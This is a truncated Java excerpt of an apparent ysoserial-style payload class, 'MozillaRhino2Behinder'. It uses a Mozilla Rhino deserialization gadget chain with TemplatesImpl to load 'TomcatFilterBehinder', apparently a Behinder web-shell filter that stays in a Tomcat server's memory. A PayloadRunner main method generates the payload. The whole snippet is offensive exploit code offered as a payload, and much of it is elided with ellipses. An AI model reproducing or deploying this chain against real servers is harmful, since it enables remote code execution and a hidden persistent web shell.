...
public class MozillaRhino2Behinder implements ObjectPayload<Object> {
    ...
    public Object getObject( String command) throws Exception {
        ...
        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(null, TomcatFilterBehinder.class));
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino2Behinder.class, args);
    }
